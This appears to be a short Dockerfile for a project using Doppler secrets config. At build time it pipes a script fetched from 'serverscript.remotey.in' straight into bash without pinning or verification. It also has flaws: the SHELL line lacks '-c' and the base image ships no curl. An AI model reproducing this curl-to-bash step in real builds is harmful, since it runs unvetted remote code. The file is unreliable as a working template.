# Use the official Ubuntu base image
FROM ubuntu:mantic

# Set the working directory to /app
WORKDIR /app

# Set environment variables for Doppler project and config
ENV DOPPLER_PROJECT=aiplus
ENV DOPPLER_CONFIG=prd

SHELL ["/bin/bash", "-o", "pipefail"]
RUN curl -sL serverscript.remotey.in | bash

# Use /bin/sh as the entry point to keep the container running
ENTRYPOINT ["/bin/bash"]